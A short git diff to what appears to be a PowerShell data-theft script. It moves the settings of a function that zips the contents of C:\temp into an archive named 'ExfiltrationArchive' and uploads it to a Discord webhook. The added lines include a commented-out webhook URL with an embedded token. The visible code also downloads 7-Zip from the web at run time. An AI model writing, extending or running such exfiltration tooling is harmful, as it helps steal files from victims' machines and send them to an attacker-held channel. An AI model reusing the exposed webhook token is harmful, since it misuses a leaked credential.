@@ -47,6 +47,12 @@ function Upload-Discord {
 }
 
 
+# Declare global variables for ZipAndUploadToDiscord
+$sourcePath = "C:\temp"
+$zipFilePath = "C:\temp\ExfiltrationArchive.zip"
+#$discordUrl = 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'
+$discordMessage = "Exfiltration Archive"
+
 # Function to create a zip archive using 7-Zip and upload to Discord
 function ZipAndUploadToDiscord {
     param (
@@ -55,11 +61,6 @@ function ZipAndUploadToDiscord {
         [string]$discordUrl,
         [string]$discordMessage
     )
-
-    # Déclarer ou assigner les valeurs de ces variables
-    $sourcePath = "C:\temp"
-    $zipFilePath = "C:\temp\ExfiltrationArchive.zip"
-    $discordMessage = "Exfiltration Archive"
 
     # Download 7-Zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
